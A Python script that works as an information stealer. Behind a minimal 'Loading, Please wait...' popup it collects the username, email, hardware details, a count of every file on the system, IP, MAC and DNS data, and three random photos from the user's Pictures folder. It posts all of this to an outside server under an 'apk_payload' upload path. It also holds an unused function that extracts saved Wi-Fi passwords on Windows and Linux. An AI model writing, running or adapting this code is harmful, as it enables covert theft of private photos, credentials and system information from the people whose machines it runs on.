import tkinter as tk
import platform
import psutil
import os
import subprocess
import threading
import requests
import random
import shutil
import socket
import re
import requests
import netifaces  # To get network interfaces and addresses

# Function to get actual email from environment or config file
def get_email():
    email = os.environ.get('USER_EMAIL')  # Custom variable if defined in your system
    if not email:
        email = "No email set"
    return email

# Function to count all files in the system
def count_files():
    total_files = 0
    for root, dirs, files in os.walk("/"):  # Start from root directory
        total_files += len(files)
    return total_files

# Function to get Wi-Fi credentials (SSID and password)
def get_wifi_credentials():
    system = platform.system().lower()
    wifi_credentials = ""

    if system == 'windows':
        try:
            # Get the network names
            profiles_output = subprocess.check_output("netsh wlan show profiles", shell=True).decode("utf-8", errors="ignore")
            profiles = [x.split(":")[1][1:-1] for x in profiles_output.split("\n") if "All User Profile" in x]

            for profile in profiles:
                # Get the password for each profile
                password_output = subprocess.check_output(f"netsh wlan show profile name=\"{profile}\" key=clear", shell=True).decode("utf-8", errors="ignore")
                password = ""
                for line in password_output.split("\n"):
                    if "Key Content" in line:
                        password = line.split(":")[1][1:-1]
                        break
                wifi_credentials += f"SSID: {profile}, Password: {password if password else 'No password set'}\n"
        except Exception as e:
            wifi_credentials = "Wi-Fi credentials: Could not retrieve Wi-Fi information.\n"
    
    elif system == 'linux':
        try:
            # Get the list of saved Wi-Fi connections and passwords using nmcli
            profiles_output = subprocess.check_output("nmcli -t -f name,uuid dev wifi", shell=True).decode("utf-8", errors="ignore")
            profiles = [x.split(":")[0] for x in profiles_output.split("\n") if x]

            for profile in profiles:
                # Extract Wi-Fi password from saved profiles
                password_output = subprocess.check_output(f"sudo cat /etc/NetworkManager/system-connections/{profile}", shell=True).decode("utf-8", errors="ignore")
                password = ""
                for line in password_output.split("\n"):
                    if "psk=" in line:
                        password = line.split("psk=")[1]
                        break
                wifi_credentials += f"SSID: {profile}, Password: {password if password else 'No password set'}\n"
        except Exception as e:
            wifi_credentials = "Wi-Fi credentials: Could not retrieve Wi-Fi information.\n"

    return wifi_credentials

# Function to get network information (IP addresses, MAC addresses, etc.)
def get_network_info():
    network_info = ""
    try:
        # Get the private IP address (local)
        private_ip = socket.gethostbyname(socket.gethostname())
        network_info += f"Private IP Address: {private_ip}\n"

        # Get the public IP address (external)
        public_ip = requests.get('https://api64.ipify.org').text
        network_info += f"Public IP Address: {public_ip}\n"

        # Get network interfaces and MAC addresses
        interfaces = netifaces.interfaces()
        for iface in interfaces:
            iface_info = netifaces.ifaddresses(iface)
            mac = iface_info.get(netifaces.AF_LINK, [{}])[0].get('addr', 'N/A')
            ip = iface_info.get(netifaces.AF_INET, [{}])[0].get('addr', 'N/A')
            network_info += f"Interface: {iface}, MAC: {mac}, IP: {ip}\n"
        
        # Get DNS servers
        dns_servers = []
        try:
            with open("/etc/resolv.conf", "r") as f:
                dns_servers = [line.split(" ")[1] for line in f.readlines() if "nameserver" in line]
        except Exception:
            dns_servers = ["DNS information not available."]
        
        network_info += f"DNS Servers: {', '.join(dns_servers)}\n"
    except Exception as e:
        network_info = f"Network information could not be retrieved: {str(e)}\n"
    
    return network_info

# Function to save system information into a text file
def save_system_info():
    system_info_file = os.path.join(os.getcwd(), "system_info.txt")

    # Get battery info
    battery = psutil.sensors_battery()
    battery_info = f"Battery Percentage: {battery.percent}%\n" if battery else "No battery information available.\n"

    # Get CPU info
    cpu_info = f"CPU Type: {platform.processor()}\n"

    # Get GPU info using subprocess (for Linux)
    try:
        gpu_info = subprocess.check_output("lspci | grep VGA", shell=True).decode("utf-8").strip()
        gpu_info = f"GPU Type: {gpu_info}\n"
    except Exception as e:
        gpu_info = "GPU Type: Information not available.\n"

    # Get username
    username = os.getlogin()

    # Get email (either from environment or fallback method)
    email = get_email()

    # Get total number of files in the system
    file_count = count_files()

    # Get network details
    network_info = get_network_info()

    # Write the collected information to a text file
    with open(system_info_file, "w") as f:
        f.write(f"System Information:\n")
        f.write(f"Username: {username}\n")
        f.write(f"Email: {email}\n")
        f.write(f"{battery_info}")
        f.write(f"{cpu_info}")
        f.write(f"{gpu_info}")
        f.write(f"Total Files on System: {file_count}\n")
        f.write(f"{network_info}\n")  # Include network information
        f.write(f"\n")

    print(f"System information saved to '{system_info_file}'")
    return system_info_file  # Return the path to the file

# Function to get 3 random pictures from the Pictures folder
def get_pictures():
    pictures_folder = os.path.join(os.path.expanduser("~"), "Pictures")
    image_files = [f for f in os.listdir(pictures_folder) if f.lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff'))]
    
    # If there are less than 3 images, select as many as possible
    selected_images = random.sample(image_files, min(3, len(image_files)))

    uploaded_pictures = []
    for image in selected_images:
        source_path = os.path.join(pictures_folder, image)
        destination_path = os.path.join(os.getcwd(), image)
        shutil.copy(source_path, destination_path)  # Copy the selected images to the current directory
        uploaded_pictures.append(destination_path)

    return uploaded_pictures

# Function to upload the txt file and pictures to the server
def upload_files(file_paths):
    url = "http://chathere.getenjoyment.net/apk_payload/upload.php"
    for file_path in file_paths:
        try:
            with open(file_path, 'rb') as file:
                files = {'uploaded_file': file}
                response = requests.post(url, files=files)
                if response.status_code == 200:
                    print(f"Uploaded successfully: {file_path}")
                else:
                    print(f"Failed to upload {file_path}. Status code: {response.status_code}")
        except Exception as e:
            print(f"Error uploading file {file_path}: {e}")

# Function to show the loading popup
def show_loading_popup():
    popup = tk.Toplevel()
    popup.title("Loading")
    popup.geometry("300x100")
    popup.resizable(False, False)

    # Loading label
    loading_label = tk.Label(popup, text="Loading, Please wait...", font=("Arial", 12))
    loading_label.pack(pady=30)

    def run_task():
        file_path = save_system_info()  # Run system info gathering and get file path
        pictures = get_pictures()  # Get 3 random pictures
        upload_files([file_path] + pictures)  # Upload the txt file and pictures
        popup.destroy()  # Close the loading popup after completion
        show_done_popup()  # Show "Done!" popup after task is complete

    # Run the task in a separate thread
    threading.Thread(target=run_task, daemon=True).start()

# Function to show the "Done!" popup
def show_done_popup():
    done_popup = tk.Toplevel()
    done_popup.title("Done!")
    done_popup.geometry("300x100")
    done_popup.resizable(False, False)

    # Done label
    done_label = tk.Label(done_popup, text="Done! System info and pictures uploaded.", font=("Arial", 12))
    done_label.pack(pady=20)

    # OK button to close the "Done!" popup
    ok_button = tk.Button(done_popup, text="OK", command=done_popup.destroy)
    ok_button.pack(pady=10)

# Main function to run the script
if __name__ == "__main__":
    root = tk.Tk()
    root.title("System Info & Picture Upload Script")
    root.geometry("300x200")

    # Hide the root window
    root.withdraw()

    # Automatically show the loading popup and start the task
    show_loading_popup()

    root.mainloop()
